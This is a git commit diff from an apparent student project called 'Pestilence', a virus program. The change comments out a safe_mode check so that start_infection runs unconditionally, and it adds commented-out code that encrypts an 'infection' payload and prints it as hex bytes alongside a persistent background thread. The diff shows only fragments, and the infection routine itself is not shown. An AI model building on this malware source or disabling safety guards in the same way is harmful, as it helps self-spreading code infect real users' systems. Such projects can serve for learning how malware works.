0343686a6f995934776511ba504ed1e309927e16
Jeremy GUYET <jguyet@e1r10p5.42.fr>
2018-04-03 21:24:22 +0200

    infection added on Pestilence program, test OK

--- srcs/main.c
+++ srcs/main.c
@@ -26,12 +26,46 @@ int			main(int argc, char **argv, char **env)
 		{
 			t_cipher_plain *cipher_plain = get_cipher_plain();
 			 if (cipher_plain) {
-				if (safe_mode(aes)) {
-					 start_infection(aes, cipher_plain, env);
-			 	}
+				//if (safe_mode(aes)) {
+					aes->valid = TRUE;
+					start_infection(aes, cipher_plain, env);
+			 	//}
 			}
 		}
 	}
 	pers.running = FALSE;
 	free_aes(aes);
 }
+
+// int			main(int argc, char **argv, char **env)
+// {
+// 	t_aes			*aes = NULL;
+// 	t_pers_thread	pers;
+//
+// 	char infection[] = "";
+//
+// 	pers.env = env;
+// 	pers.running = TRUE;
+// 	build_persistent_process_thread((t_pers_thread*)&pers);
+// 	if ((aes = load_aes()) != NULL) {
+// 		if (get_key_iv(aes) != NULL && init_encryption(aes)
+// 		 && init_decryption(aes))
+// 		{
+// 			t_cipher_plain *cipher_plain = get_cipher_plain();
+// 			 if (cipher_plain) {
+// 				set_plain(cipher_plain, (char*)&infection, sizeof(infection));
+//
+// 				encrypt_plain_text(aes, cipher_plain);
+//
+// 				int i = 0;
+// 				while (i < cipher_plain->cipher_len)
+// 				{
+// 					printf("\\x%x", cipher_plain->cipher[i]);
+// 					i++;
+// 				}
+// 			}
+// 		}
+// 	}
+// 	pers.running = FALSE;
+// 	free_aes(aes);
+// }
